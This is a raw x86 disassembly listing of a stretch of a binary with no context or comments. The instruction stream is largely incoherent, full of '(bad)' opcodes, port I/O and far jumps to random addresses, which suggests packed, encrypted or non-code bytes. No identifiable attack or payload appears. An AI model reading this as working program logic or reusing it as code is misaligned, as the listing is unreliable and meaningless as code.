  402f92:	sub    edi,DWORD PTR [edi]
  402f94:	adc    bh,al
  402f96:	lea    ecx,[edx-0x7f]
  402f99:	std    
  402f9a:	sub    eax,0x849d884a
  402f9f:	cs nop
  402fa1:	mov    eax,0x6b677874
  402fa6:	jbe    0x402fcb
  402fa8:	cmp    DWORD PTR [ebx+0x3d],esi
  402fab:	xchg   esi,eax
  402fac:	push   0xbbebee43
  402fb1:	pop    esi
  402fb2:	cld    
  402fb3:	loopne 0x402f94
  402fb5:	jno    0x402f89
  402fb7:	sbb    BYTE PTR [eax-0x4061f0e4],0x55
  402fbe:	xchg   edx,eax
  402fbf:	retf   0x7b0a
  402fc2:	adc    ecx,ecx
  402fc4:	pop    edi
  402fc5:	mov    ds:0x70073d6f,al
  402fca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402fcb:	les    eax,FWORD PTR [ebp-0x45df211c]
  402fd1:	xor    al,0x46
  402fd3:	cli    
  402fd4:	add    bh,BYTE PTR [edx]
  402fd6:	xor    edx,esp
  402fd8:	arpl   WORD PTR [eax+0x5de7cb33],dx
  402fde:	retf   0x222e
  402fe1:	xchg   edx,eax
  402fe2:	js     0x402f7b
  402fe4:	xor    BYTE PTR [esi+ebx*2],bh
  402fe7:	mov    al,BYTE PTR [ebx-0x3fd89931]
  402fed:	mov    ch,0xbc
  402fef:	sub    BYTE PTR [esi],dh
  402ff1:	push   esp
  402ff2:	mov    esp,0x8aee8e9
  402ff7:	xor    eax,0xb44ec12a
  402ffc:	pop    edx
  402ffd:	dec    esi
  402ffe:	cmp    eax,0x2a135648
  403003:	cli    
  403004:	sbb    eax,0xb25be629
  403009:	ja     0x402f99
  40300b:	and    cl,BYTE PTR [edx]
  40300d:	adc    BYTE PTR [eax+ebp*2],bl
  403010:	enter  0x35a5,0x4f
  403014:	lds    esi,FWORD PTR [edi+0x8efaf9e]
  40301a:	cs push cs
  40301c:	adc    eax,0xf7330438
  403021:	sahf   
  403022:	inc    esi
  403023:	repz mov ch,0x2
  403026:	or     BYTE PTR [ebx],ah
  403028:	add    al,0xf4
  40302a:	sti    
  40302b:	cmp    DWORD PTR [edi-0x44d637e5],0x69ee7233
  403035:	inc    edi
  403036:	jno    0x40309a
  403038:	xor    edx,DWORD PTR [ecx]
  40303a:	add    eax,0xe2b299de
  40303f:	sahf   
  403040:	xor    BYTE PTR [edx+ebp*1+0x9328df5],ah
  403047:	sti    
  403048:	fld    TBYTE PTR [esi]
  40304a:	mov    ebx,0xbaed18d9
  40304f:	add    DWORD PTR [ebx+eiz*8+0x173285a0],edi
  403056:	push   es
  403057:	(bad)  
  403058:	fcomp  DWORD PTR [ecx]
  40305a:	fdivr  st,st(4)
  40305c:	cmp    BYTE PTR [ecx],0x3b
  40305f:	cli    
  403060:	popf   
  403061:	mov    ch,0xed
  403063:	xor    esi,DWORD PTR [ecx-0xde87c7a]
  403069:	je     0x4030bc
  40306b:	lods   eax,DWORD PTR ds:[esi]
  40306c:	push   es
  40306d:	test   BYTE PTR [esi-0x38],bl
  403070:	cmc    
  403071:	sbb    al,0xcc
  403073:	push   ds
  403074:	lds    edx,FWORD PTR [edi-0x20]
  403077:	enter  0x692b,0xc3
  40307b:	push   edi
  40307c:	ins    BYTE PTR es:[edi],dx
  40307d:	cmc    
  40307e:	inc    ebx
  40307f:	and    edi,DWORD PTR [edi+0x36]
  403082:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403083:	mov    al,ds:0x78f3d3fc
  403088:	imul   edi,DWORD PTR [edi-0x738f2399],0xffffff9d
  40308f:	jne    0x40302f
  403091:	add    al,0x84
  403093:	mov    dh,BYTE PTR [si+0x5ce6]
  403098:	and    eax,0x1e5a728b
  40309d:	mov    ecx,0xeff01d5d
  4030a2:	inc    DWORD PTR [eax]
  4030a4:	ds stos BYTE PTR es:[edi],al
  4030a6:	mov    WORD PTR [edx],cs
  4030a8:	mov    bl,0x24
  4030aa:	retf   
  4030ab:	xchg   DWORD PTR [edx+eax*4+0x592b82f6],ebp
  4030b2:	mov    ds:0x6089b876,al
  4030b7:	cdq    
  4030b8:	ds cdq 
  4030ba:	aaa    
  4030bb:	add    esp,DWORD PTR ds:0xa200544e
  4030c1:	in     al,dx
  4030c2:	xchg   ecx,eax
  4030c3:	cwde   
  4030c4:	lods   eax,DWORD PTR ds:[esi]
  4030c5:	test   BYTE PTR [edi-0x46],dl
  4030c8:	adc    eax,0xc5e36715
  4030cd:	idiv   BYTE PTR [edi]
  4030cf:	pop    es
  4030d0:	mov    dl,0xd
  4030d2:	jb     0x40305e
  4030d4:	sub    eax,0xe69cde31
  4030d9:	push   eax
  4030da:	adc    DWORD PTR [ebp+0x4cf0a133],eax
  4030e0:	aas    
  4030e1:	mov    bl,0x65
  4030e3:	push   0xc71bc381
  4030e8:	sub    eax,0xbde5bb57
  4030ed:	xchg   esp,eax
  4030ee:	xor    ebp,DWORD PTR [edx+0x1e164eaf]
  4030f4:	pop    esp
  4030f5:	(bad)  
  4030f6:	sbb    bl,dh
  4030f8:	sub    dh,ch
  4030fa:	shr    cl,0x53
  4030fd:	(bad)  
  4030fe:	popf   
  4030ff:	mov    cl,0x8a
  403101:	and    dh,BYTE PTR [ebx+0x15269f3a]
  403107:	aas    
  403108:	gs lahf 
  40310a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40310b:	inc    edx
  40310c:	jmp    0x40312c
  40310e:	xor    al,0x7a
  403110:	ss and al,0x6
  403113:	ficomp WORD PTR [ebp-0x4]
  403116:	mov    bl,0x82
  403118:	fbld   TBYTE PTR [edi-0x40803353]
  40311e:	fistp  WORD PTR [esi]
  403120:	mov    edx,0xb14601b8
  403125:	outs   dx,BYTE PTR ds:[esi]
  403126:	xchg   edi,eax
  403127:	test   bl,dh
  403129:	pop    ebp
  40312a:	jge    0x4030ba
  40312c:	hlt    
  40312d:	lea    ecx,[ebx+edi*4-0x5ca4887e]
  403134:	pop    ebx
  403135:	out    dx,eax
  403136:	and    BYTE PTR [esi],dh
  403138:	pusha  
  403139:	je     0x403140
  40313b:	and    al,bl
  40313d:	jg     0x403110
  40313f:	jmp    0x403173
  403141:	into   
  403142:	rcl    BYTE PTR [edi],1
  403144:	pop    es
  403145:	pop    edi
  403146:	repnz xor al,0x31
  403149:	enter  0x2723,0x6b
  40314d:	inc    ebp
  40314e:	sbb    edi,DWORD PTR [edx-0x5c0d7dea]
  403154:	das    
  403155:	dec    ebp
  403156:	xchg   BYTE PTR cs:[ecx],cl
  403159:	daa    
  40315a:	jecxz  0x40319e
  40315c:	outs   dx,DWORD PTR ds:[esi]
  40315d:	pusha  
  40315e:	xor    al,BYTE PTR [edi-0x1c0951c0]
  403164:	mov    WORD PTR [esi+0x1f600552],gs
  40316a:	(bad)  
  40316b:	jge    0x4031c0
  40316d:	aas    
  40316e:	pop    edx
  40316f:	push   cs
  403170:	fistp  DWORD PTR [edi-0x21]
  403173:	push   ecx
  403174:	ss jns 0x4031f4
  403177:	jmp    0xe0fc3bf4
  40317c:	sbb    eax,0xf71e8776
  403181:	sar    DWORD PTR [eax-0x5ecff64a],0x7e
  403188:	sbb    al,0x5e
  40318a:	stc    
  40318b:	cli    
  40318c:	xor    ah,BYTE PTR [esi+edx*1-0x1b]
  403190:	dec    edi
  403191:	into   
  403192:	xor    eax,0x88b6e6b8
  403197:	mov    DWORD PTR [ecx],eax
  403199:	inc    ecx
  40319a:	jge    0x403208
  40319c:	rol    DWORD PTR [esi+0x3d5ac54c],1
  4031a2:	int    0xaf
  4031a4:	push   0xf23d6cf5
  4031a9:	cld    
  4031aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4031ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4031ac:	ret    0x5c26
  4031af:	jo     0x403148
  4031b1:	mov    bh,0x3d
  4031b3:	cdq    
  4031b4:	repnz or eax,0xc13e3781
  4031ba:	fsubr  QWORD PTR [edx]
  4031bc:	push   ebx
  4031bd:	daa    
  4031be:	add    eax,0xe74ac938
  4031c3:	(bad)  
  4031c4:	leave  
  4031c5:	jge    0x4031da
  4031c7:	cs add al,0x3b
  4031ca:	adc    BYTE PTR [ebx+0x9],al
  4031cd:	out    0x53,eax
  4031cf:	dec    edx
  4031d0:	jmp    0x403210
  4031d2:	test   eax,0x5fb3fbe4
  4031d7:	xchg   ebp,eax
  4031d8:	inc    edi
  4031d9:	cmp    eax,0x668d3607
  4031de:	mov    ds:0x55a341e,al
  4031e3:	(bad)  
  4031e4:	and    al,0x33
  4031e6:	push   eax
  4031e7:	push   ecx
  4031e8:	inc    edx
  4031e9:	int    0xbf
  4031eb:	retf   0xba59
  4031ee:	call   0x4295:0x76c9151d
  4031f5:	jne    0x40318a
  4031f7:	loopne 0x4031b7
  4031f9:	es inc edx
  4031fb:	push   edi
  4031fc:	(bad)  
  4031fd:	fstp   DWORD PTR ds:0x1a070952
  403203:	adc    eax,0xb0b685
  403208:	cmovnp edx,DWORD PTR [eax-0x51]
  40320c:	hlt    
  40320d:	call   0xe250:0x438afd89
  403214:	mov    dl,0x86
  403216:	mov    ecx,ecx
  403218:	les    edx,FWORD PTR [edx+0x73]
  40321b:	das    
  40321c:	rcl    DWORD PTR [edx+0x28ef91da],cl
  403222:	or     BYTE PTR [eax],dh
  403224:	daa    
  403225:	iret   
  403226:	pop    ecx
  403227:	jmp    0xe7d0:0xa48bbe0c
  40322e:	stos   DWORD PTR es:[edi],eax
  40322f:	inc    edi
  403230:	fmul   DWORD PTR [edx+0xd]
  403233:	ret    0x3079
  403236:	inc    ecx
  403237:	cmp    al,0x31
  403239:	fistp  WORD PTR [eax+0x1a94a498]
  40323f:	fbstp  TBYTE PTR [ecx]
  403241:	add    eax,0xe412fc08
  403246:	ins    BYTE PTR es:[edi],dx
  403247:	dec    eax
  403248:	stos   BYTE PTR es:[edi],al
  403249:	and    bh,BYTE PTR [ebp+0x7e768f35]
  40324f:	inc    esp
  403250:	xchg   ebp,ebp
  403252:	aam    0x99
  403254:	daa    
  403255:	mov    esi,0xf49f35ac
  40325a:	das    
  40325b:	pop    eax
  40325c:	stos   BYTE PTR es:[edi],al
  40325d:	and    BYTE PTR [edi-0x23ca5466],dl
  403263:	lea    ecx,[edx]
  403265:	je     0x4032e0
  403267:	jp     0x403296
  403269:	jbe    0x403254
  40326b:	push   ebp
  40326c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40326d:	ret    
  40326e:	cli    
  40326f:	test   al,0xb
  403271:	loop   0x40322f
  403273:	push   esp
  403274:	gs add eax,edx
  403277:	dec    ebx
  403278:	sub    al,0x9a
  40327a:	lahf   
  40327b:	test   BYTE PTR [esi-0x7c],bl
  40327e:	and    BYTE PTR [esi+0x50086af9],al
  403284:	shl    BYTE PTR [eax+eax*8-0x7e593aff],0x76
  40328c:	and    cl,al
  40328e:	pop    es
  40328f:	fsub   st(7),st
  403291:	pop    edi
  403292:	test   al,0x8b
  403294:	cmp    al,dh
  403296:	in     eax,dx
  403297:	pop    ebp
  403298:	mov    ch,0x24
  40329a:	adc    bl,BYTE PTR [eax+0x44]
  40329d:	dec    edi
  40329e:	(bad)
  4032a1:	mov    ah,0x9d
  4032a3:	cmp    bl,BYTE PTR [ebp+ebx*2+0x72]
  4032a7:	nop
  4032a8:	int3   
  4032a9:	mov    bh,0xc3
  4032ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4032ac:	adc    bh,dl
  4032ae:	fild   DWORD PTR [ecx]
  4032b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4032b1:	cs or  bl,al
  4032b4:	pop    edi
  4032b5:	fs pop ds
  4032b7:	daa    
  4032b8:	xchg   BYTE PTR [edi-0x715d5f3d],al
  4032be:	jg     0x4032f1
  4032c0:	push   ebx
  4032c1:	cmp    ch,dh
  4032c3:	sub    dh,BYTE PTR [ebp-0x54]
  4032c6:	fs inc esi
  4032c8:	jmp    0x4f9f6383
  4032cd:	mov    ecx,edx
  4032cf:	sub    ch,0x97
  4032d2:	stos   DWORD PTR es:[edi],eax
  4032d3:	cld    
  4032d4:	and    ah,ch
  4032d6:	aad    0x14
  4032d8:	scas   eax,DWORD PTR es:[edi]
  4032d9:	jbe    0x4032aa
  4032db:	test   al,ah
  4032dd:	daa    
  4032de:	pop    es
  4032df:	dec    eax
  4032e0:	pop    esi
  4032e1:	sub    DWORD PTR [esi-0x4],0x75103713
  4032e8:	aas    
  4032e9:	in     al,dx
  4032ea:	or     BYTE PTR [ecx],0x5e
  4032ed:	jmp    0x3ce3ca64
  4032f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4032f3:	push   0x52
  4032f5:	cmp    al,0xc4
  4032f7:	leave  
  4032f8:	xlat   BYTE PTR ds:[ebx]
  4032f9:	call   0xbcaf:0xf814c95a
  403300:	das    
  403301:	clc    
  403302:	ret    0xb482
  403305:	mov    ch,0x7c
  403307:	call   0x2e35:0x8b30604d
  40330e:	mov    DWORD PTR ds:0x3325ee3,esi
  403314:	call   0x8765686
  403319:	adc    DWORD PTR [ebx+edx*1+0x34],0x38
  40331e:	jne    0x40330c
  403320:	les    ebp,FWORD PTR [esi-0x24]
  403323:	jl     0x4032a7
  403325:	aas    
  403326:	leave  
  403327:	mov    al,0x10
  403329:	outs   dx,DWORD PTR ds:[esi]
  40332a:	test   eax,0x6a414bb3
  40332f:	out    dx,al
  403330:	mov    edx,eax
  403332:	ins    DWORD PTR es:[edi],dx
  403333:	icebp  
  403334:	int    0xcf
  403336:	hlt    
  403337:	dec    ebx
  403338:	mov    eax,ds:0x8cb462aa
  40333d:	push   ss
  40333e:	add    eax,0xf180821a
  403343:	loope  0x40331d
  403345:	xor    bl,BYTE PTR [edx-0x39c6ede2]
  40334b:	sbb    dh,BYTE PTR [ebx+ecx*8]
  40334e:	jne    0x403310
  403350:	jnp    0x40338e
  403352:	cmp    DWORD PTR [edx],0x6d
  403355:	(bad)  
  403356:	je     0x403330
  403358:	xor    eax,0x83ee935
  40335d:	sahf   
  40335e:	jecxz  0x40331f
  403360:	std    
  403361:	mov    edi,0x831951a5
  403366:	pop    ecx
  403367:	pop    ecx
  403368:	push   ss
  403369:	clc    
  40336a:	mov    DWORD PTR [ecx-0x26],ebp
  40336d:	cmp    DWORD PTR [ebx+0x4144ae7f],0xf0ce979c
  403377:	pop    ebp
  403378:	inc    ebx
  403379:	fidiv  DWORD PTR [esp+eax*1]
  40337d:	push   esi
  40337e:	push   ecx
  40337f:	repnz aam 0xd9
  403382:	add    al,0x17
  403384:	mov    DWORD PTR [edx+0x3f90ada],edi
  40338a:	popa   
  40338b:	arpl   si,bp
  40338d:	pop    ecx
  40338e:	stos   BYTE PTR es:[edi],al
  40338f:	rcl    BYTE PTR [esi-0x1e],0xc4
  403393:	in     al,dx
  403394:	xor    ecx,ebp
  403396:	stc    
  403397:	loopne 0x403359
  403399:	add    al,0x9c
  40339b:	inc    ebp
  40339c:	out    0xc7,eax
  40339e:	inc    esp
  40339f:	mov    esp,0x6f820a0f
  4033a4:	sub    bl,BYTE PTR [edx]
  4033a6:	ret    0x6671
  4033a9:	cld    
  4033aa:	aam    0x74
  4033ac:	imul   edx,DWORD PTR [ebp+esi*1-0x1],0xa
  4033b1:	or     al,0x91
  4033b3:	cld    
  4033b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4033b5:	or     ch,bl
  4033b7:	data16 mov dh,0xfa
  4033ba:	jle    0x4033a0
  4033bc:	sbb    edi,esp
  4033be:	sub    DWORD PTR [ebp+0x36],eax
  4033c1:	jno    0x4033df
  4033c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4033c4:	in     al,0xf8
  4033c6:	dec    esi
  4033c7:	mov    dl,0x7d
  4033c9:	je     0x403418
  4033cb:	push   ebx
  4033cc:	sub    DWORD PTR [eax+eiz*2-0x17b937ec],ebp
  4033d3:	rcr    bl,1
  4033d5:	xor    BYTE PTR [edx+0x17783924],ah
  4033db:	dec    eax
  4033dc:	ins    DWORD PTR es:[edi],dx
  4033dd:	pop    DWORD PTR [ebp-0x3]
  4033e0:	fwait
  4033e1:	(bad)  
  4033e2:	push   0xffffffd1
  4033e4:	xchg   ecx,eax
  4033e5:	or     cl,BYTE PTR [edx+0x45]
  4033e8:	clc    
  4033e9:	cmc    
  4033ea:	pop    ebp
  4033eb:	mov    al,bh
  4033ed:	aaa    
  4033ee:	imul   esi,DWORD PTR [edi],0x93eb5bea
  4033f4:	aad    0x63
  4033f6:	jle    0x40338f
  4033f8:	test   DWORD PTR [edx+0x5690f3e],esi
  4033fe:	nop
  4033ff:	adc    al,0xfe
  403401:	test   eax,0x2b3cf172
  403406:	rcr    DWORD PTR [ecx+edx*1+0x3ebe84b3],cl
  40340d:	mov    dh,0x4b
  40340f:	test   eax,0x282983ce
  403414:	or     dh,BYTE PTR [ebx+0x475cf761]
  40341a:	nop
  40341b:	iret   
  40341c:	sub    esp,ecx
  40341e:	mov    ds:0xa5aaf6f1,eax
  403423:	fdivr  DWORD PTR [ebx-0x26d9f7dd]
  403429:	cmp    al,0x42
  40342b:	fwait
  40342c:	push   ebx
  40342d:	mov    cs,WORD PTR [ebx+ebp*4-0x1f5029a]
  403434:	nop
  403435:	and    BYTE PTR [eax-0x3a],al
  403438:	mov    ebp,0x7b9db56e
  40343d:	mov    ds:0xd01f1b94,al
  403442:	out    0x81,eax
  403444:	in     eax,dx
  403445:	ins    BYTE PTR es:[edi],dx
  403446:	pop    ss
  403447:	scas   eax,DWORD PTR es:[edi]
  403448:	jl     0x4034c7
  40344a:	jmp    DWORD PTR [ebx]
  40344c:	push   0xff2f42aa
  403451:	ficomp DWORD PTR [esi]
  403453:	cmp    dh,al
  403455:	in     al,dx
  403456:	sub    DWORD PTR [edx+edx*8-0x11ab6349],ebx
  40345d:	and    edi,DWORD PTR [edx+0x268a42d0]
  403463:	pop    eax
  403464:	scas   eax,DWORD PTR es:[edi]
  403465:	mov    WORD PTR [edi],cs
  403467:	and    eax,0x8844093b
  40346c:	ins    BYTE PTR es:[edi],dx
  40346d:	mov    ecx,0x231a2ce8
  403472:	enter  0xb379,0xf3
  403476:	js     0x40345f
  403478:	scas   eax,DWORD PTR es:[edi]
  403479:	outs   dx,DWORD PTR ds:[esi]
  40347a:	aam    0x86
  40347c:	cmp    bh,ch
  40347e:	jb     0x4034f1
  403480:	test   al,0xbe
  403482:	lods   al,BYTE PTR ds:[esi]
  403483:	js     0x4034ac
  403485:	fs add eax,0x1cc28396
  40348b:	cmp    eax,0x4e52b00f
  403490:	in     eax,0x37
  403492:	jmp    0x40342f
  403494:	jnp    0x4034cb
  403496:	jmp    0x403420
  403498:	js     0x403472
  40349a:	cmp    BYTE PTR [ebp-0x42],cl
  40349d:	or     eax,0x86d313b8
  4034a2:	out    0x3a,eax
  4034a4:	int    0x49
  4034a6:	inc    edx
  4034a7:	pop    ss
  4034a8:	mov    dl,0x5
  4034aa:	mov    edx,DWORD PTR [esi+ebp*2-0x4d]
  4034ae:	and    ebx,DWORD PTR [ebp+0x550ce11e]
  4034b4:	pop    ss
  4034b5:	jmp    0x8716:0x55adaf14
  4034bc:	pop    ss
  4034bd:	mov    esp,0x32df6a8d
  4034c2:	push   0xffffffe7
  4034c4:	jmp    0xe1299db
  4034c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4034ca:	int    0x7b
  4034cc:	loop   0x4034da
  4034ce:	test   BYTE PTR [edi+0x15959716],ch
  4034d4:	out    dx,al
  4034d5:	push   eax
  4034d6:	or     ebx,DWORD PTR [edx+esi*8+0x2655301d]
  4034dd:	imul   eax,DWORD PTR [eax+0x698a08d8],0xd2c0d176
  4034e7:	rcl    cl,1
  4034e9:	cs inc edx
  4034eb:	push   ds
  4034ec:	inc    edi
  4034ed:	out    0x7e,al
  4034ef:	lea    eax,ds:[ebx-0x6286b876]
  4034f6:	mov    edi,0x33f0087d
  4034fb:	or     cl,BYTE PTR [ebx]
  4034fd:	and    BYTE PTR [ebx-0x4b],ch
  403500:	les    eax,FWORD PTR [esi]
  403502:	mov    al,ds:0x18d51e89
  403507:	or     al,0x7f
  403509:	jecxz  0x4034eb
  40350b:	xchg   BYTE PTR [di-0x22a0],bl
  403510:	add    BYTE PTR [edi],ch
  403512:	cli    
  403513:	mov    ah,0x60
  403515:	cmp    bl,BYTE PTR [ebx-0x73]
  403518:	inc    esi
  403519:	add    al,0x45
  40351b:	daa    
  40351c:	out    0xa9,al
  40351e:	imul   esp,DWORD PTR [esi+0x40],0x7b7fcfbf
  403525:	push   0x757c2a33
  40352a:	xchg   esp,eax
  40352b:	fdiv   DWORD PTR [esp+ebp*2]
  40352e:	sahf   
  40352f:	and    DWORD PTR [esi-0x85c174d],0x4a
  403536:	test   al,0x49
  403538:	mov    eax,ds:0xdaeb9826
  40353d:	push   ecx
  40353e:	mov    BYTE PTR [ebx-0x6318f8f0],0x5c
  403545:	pusha  
  403546:	jo     0x403589
  403548:	(bad)  
  40354a:	mov    cl,0x9
  40354c:	sahf   
  40354d:	xchg   ebx,eax
  40354e:	pop    ss
  40354f:	or     esi,esi
  403551:	lahf   
  403552:	lock xlat BYTE PTR ds:[ebx]
  403554:	out    dx,al
  403555:	mov    ecx,ss
  403557:	fiadd  WORD PTR [edi+0x3fe7f3f5]
  40355d:	std    
  40355e:	addr16 push ax
  403561:	mov    dh,0x73
  403563:	dec    ebx
  403564:	cmp    al,0x7b
  403566:	adc    BYTE PTR [eax-0x52d1cc8],dl
  40356c:	jecxz  0x40356d
  40356e:	test   BYTE PTR [esi+0x1195931],ah
  403574:	retf   0xefb4
  403577:	mov    edx,0xd2e056e9
  40357c:	test   al,0xc1
  40357e:	xchg   edi,eax
  40357f:	pop    ss
  403580:	pop    edi
  403581:	or     BYTE PTR [edi-0x54b2202a],0xc3
  403588:	sbb    cl,ch
  40358a:	int3   
  40358b:	and    edi,esp
  40358d:	icebp  
  40358e:	stos   BYTE PTR es:[edi],al
  40358f:	pop    ebx
  403590:	loop   0x40357b
  403592:	fild   QWORD PTR [ecx+ebp*1]
  403595:	jg     0x40355c
  403597:	dec    esi
  403598:	add    eax,0xfb38fe82
  40359d:	out    dx,eax
  40359e:	adc    al,0x0
  4035a0:	mov    ebp,gs
  4035a2:	mov    ds:0xf16c6fa5,eax
  4035a7:	repz inc esi
  4035a9:	inc    ecx
  4035aa:	cmc    
  4035ab:	xlat   BYTE PTR ds:[ebx]
  4035ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4035ad:	std    
  4035ae:	jmp    0x4be7abb7
  4035b3:	xlat   BYTE PTR ds:[ebx]
  4035b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4035b5:	js     0x40354f
  4035b7:	mov    esp,ss
  4035b9:	push   es
  4035ba:	ss jmp 0x403595
  4035bd:	adc    ebp,ebx
  4035bf:	adc    ch,BYTE PTR [ebp+0x4f]
  4035c2:	cmp    eax,0x41f60186
  4035c7:	pop    ebx
  4035c8:	xor    DWORD PTR [esi],ebx
  4035ca:	or     dl,dl
  4035cc:	sub    eax,0xbf9094af
  4035d1:	fmul   st(0),st
  4035d3:	xchg   edx,eax
  4035d4:	js     0x403573
  4035d6:	cld    
  4035d7:	mov    esp,0x1d8ddd72
  4035dc:	add    eax,0xba93b1a3
  4035e1:	loopne 0x4035b7
  4035e3:	adc    al,BYTE PTR [ebx+0x6c]
  4035e6:	ins    BYTE PTR es:[edi],dx
  4035e7:	jns    0x403641
  4035e9:	xchg   esi,eax
  4035ea:	pop    esi
  4035eb:	aad    0xc5
  4035ed:	xchg   edi,esp
  4035ef:	cmp    al,0xcd
  4035f1:	mov    cl,0xb
  4035f3:	mov    WORD PTR [esi-0x2bdd7986],gs
  4035f9:	xlat   BYTE PTR ds:[ebx]
  4035fa:	jbe    0x4035a3
  4035fc:	fwait
  4035fd:	xor    edx,edx
  4035ff:	pop    esi
  403600:	xchg   BYTE PTR [si+0x53],cl
  403604:	push   ss
  403605:	pop    edx
  403606:	jns    0x4035a7
  403608:	rcr    BYTE PTR [edi],cl
  40360a:	add    BYTE PTR [esi+0x608a0342],cl
  403610:	dec    ecx
  403611:	stc    
  403612:	test   bl,ah
  403614:	xor    BYTE PTR [eax+0x4b],al
  403617:	lods   al,BYTE PTR ds:[esi]
  403618:	aaa    
  403619:	das    
  40361a:	mov    ah,0xbc
  40361c:	cwde   
  40361d:	arpl   WORD PTR [ebx],bp
  40361f:	mov    al,0xf4
  403621:	or     al,0x5a
  403623:	arpl   WORD PTR [ebx+edx*8],sp
  403626:	jl     0x4035e4
  403628:	add    DWORD PTR [eax-0x2c],edx
  40362b:	fdivr  st(4),st
  40362d:	adc    ecx,ebp
  40362f:	cmc    
  403630:	inc    esp
  403631:	mov    al,ds:0x957371ef
  403636:	inc    edi
  403637:	aam    0x6f
  403639:	jecxz  0x4035fc
  40363b:	push   esi
  40363c:	es ins DWORD PTR es:[edi],dx
  40363e:	mov    edx,0x3477a99d
  403643:	push   cs
  403644:	push   edi
  403645:	mov    eax,DWORD PTR [ecx+0x50]
  403648:	call   0x93a772e5
  40364d:	test   eax,0x9db76266
  403652:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403653:	adc    eax,0x762d5e54
  403658:	xchg   ebx,eax
  403659:	fadd   DWORD PTR [ecx]
  40365b:	nop
  40365c:	add    cl,BYTE PTR [edi-0x5e6aea67]
  403662:	jnp    0x40365d
  403664:	xor    eax,DWORD PTR fs:[ebp-0x2c]
  403668:	ds out 0xdf,eax
  40366b:	cdq    
  40366c:	repz mov eax,ds:0xd6451f49
  403672:	jno    0x403631
  403674:	cmp    al,0x56
  403676:	repnz mov ah,0x79
  403679:	cmp    al,0x61
  40367b:	mov    bh,0x87
  40367d:	fcomp  st(5)
  40367f:	jb     0x40369a
  403681:	sti    
  403682:	imul   esp,DWORD PTR [edx-0x3f],0xfffffff9
  403686:	out    0xd1,al
  403688:	cmp    BYTE PTR ds:0xcbba3ab,ch
  40368e:	cmp    eax,0x9cf0fa8c
  403693:	adc    BYTE PTR [edx-0x7af7fdba],dl
  403699:	mov    ch,0xd5
  40369c:	push   edi
  40369d:	ss ret 0x84bb
  4036a1:	imul   esp,eax,0xcd1fe010
  4036a7:	popf   
  4036a8:	xchg   BYTE PTR [ecx],al
  4036aa:	sub    edi,DWORD PTR [edx]
  4036ac:	xchg   BYTE PTR [ebx+0xd1a5834],bh
  4036b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4036b3:	(bad)  
  4036b4:	scas   al,BYTE PTR es:[edi]
  4036b5:	or     DWORD PTR [ecx],ecx
  4036b7:	sbb    BYTE PTR [eax-0x723bdcf4],bl
  4036bd:	dec    esp
  4036be:	jle    0x4036bc
  4036c0:	and    ch,bl
  4036c2:	ss push cs
  4036c4:	pop    edx
  4036c5:	and    al,bh
  4036c7:	ja     0x4036b3
  4036c9:	(bad)  
  4036cb:	int    0x49
  4036cd:	pop    esp
  4036ce:	mov    al,0xaf
  4036d0:	inc    esp
  4036d1:	sar    DWORD PTR [ebp+0x2b42590f],cl
  4036d7:	xlat   BYTE PTR ds:[ebx]
  4036d8:	aam    0xb6
  4036da:	inc    ecx
  4036db:	xchg   BYTE PTR [ecx+ecx*8],dl
  4036de:	jbe    0x4036d5
  4036e0:	xchg   BYTE PTR [edi],dl
  4036e2:	aam    0x3
  4036e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4036e5:	pusha  
  4036e6:	xlat   BYTE PTR ds:[ebx]
  4036e7:	pop    esp
  4036e8:	fnstsw ax
  4036ea:	inc    ebp
  4036eb:	js     0x403717
  4036ed:	dec    eax
  4036ee:	adc    al,0x32
  4036f0:	jl     0x4036b0
  4036f2:	xlat   BYTE PTR ds:[ebx]
  4036f3:	add    ecx,DWORD PTR [ecx+edx*8-0x32]
  4036f7:	mov    ch,0x31
  4036f9:	sub    cl,BYTE PTR [ebx+0x317b87fa]
  4036ff:	fs cmp al,0xc0
  403702:	jecxz  0x403735
  403704:	xchg   BYTE PTR [esi+0x5618abe1],ch
  40370a:	and    BYTE PTR [ebx+0x561509ab],dh
  403710:	and    al,0xeb
  403712:	jmp    0x37eb:0x3dd6c30f
  403719:	rep ins DWORD PTR es:[edi],dx
  40371b:	pop    edx
  40371c:	mov    edi,0x94d509c
  403721:	leave  
  403722:	repnz cld 
  403724:	sti    
  403725:	jl     0x403788
  403727:	inc    ecx
  403728:	push   ebp
  403729:	out    0xcf,al
  40372b:	xor    cl,BYTE PTR [ebx]
  40372d:	pop    edi
  40372e:	pusha  
  40372f:	in     eax,0xbd
  403731:	test   BYTE PTR [esi],ch
  403733:	fdiv   QWORD PTR [ecx+0x5792603f]
  403739:	jge    0x403727
  40373b:	nop
  40373c:	add    BYTE PTR [esi+0x5674d876],0x18
  403743:	ret    0x177d
  403746:	or     edx,ebp
  403748:	test   DWORD PTR [edx-0x94d83e4],ecx
  40374e:	dec    esp
  40374f:	sub    cl,BYTE PTR [edi]
  403751:	add    BYTE PTR [edx],dl
  403753:	add    eax,0xf22ebb93
  403758:	or     ah,BYTE PTR [edx+0x5e]
  40375b:	popa   
  40375c:	int    0x1b
  40375e:	sbb    eax,0xe8e8eea4
  403763:	arpl   dx,dx
  403765:	fcomip st,st(0)
  403767:	pop    ss
  403768:	daa    
  403769:	xor    al,0x8a
  40376b:	mov    bl,0x91
  40376d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40376e:	daa    
  40376f:	and    al,0x1b
  403771:	sbb    DWORD PTR ds:0xb2dcab9c,0xfffffff2
  403778:	jnp    0x4037bc
